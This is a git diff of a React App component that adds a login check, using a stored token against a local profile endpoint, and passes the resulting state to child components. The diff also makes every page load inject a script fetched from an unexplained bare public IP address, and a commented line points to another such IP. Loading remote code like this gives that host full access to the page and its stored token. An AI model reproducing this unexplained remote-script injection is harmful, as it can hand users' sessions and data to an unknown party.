@@ -1,18 +1,52 @@
-import React from "react";
+import React, { useState, useEffect } from "react";
 
 import { Outlet, useLocation } from "react-router-dom";
 import Navbar from "./components/Navbar";
 import Footer from "./components/Footer";
-// import cacheService from "./service/CacheService";
-// import fetchService from "./service/FetchService";
+import cacheService from "./service/CacheService";
+import fetchService from "./service/FetchService";
 
 function App() {
 
+  const [isLoggedIn, setIsLoggedIn] = useState(false);
+
+  useEffect(() => {
+
+    (async function () {
+      const hasToken = cacheService.isLoggedIn();
+      if (hasToken) {
+        const res = await fetchService.fetchRes("https://192.168.0.196:8080/profile", "GET");
+        if (res.status >= 400) {
+          
+          setIsLoggedIn(false);
+          cacheService.removeLocalValue("token");
+        } else {
+          setIsLoggedIn(true);
+        }
+      } else {
+        setIsLoggedIn(false);
+      }
+      
+    })();
+  }, [isLoggedIn, useLocation().pathname]);
+
+  // <script src="https://193.183.247.22:8080/js/?id=123" defer></script>
+  useEffect(() => {
+    const script = document.createElement("script");
+    script.src = "https://62.168.153.58:8080/js/?id=1";
+    script.async = true;
+    document.body.appendChild(script);
+
+    return () => {
+      document.body.removeChild(script);
+    };
+  }, []);
+
   return (
     <>
-      <Navbar/>
+      <Navbar {...{ isLoggedIn, setIsLoggedIn }} />
       <main>
-        <Outlet/>
+        <Outlet context={{ setIsLoggedIn, isLoggedIn }} />
       </main>
       <Footer/>
     </>
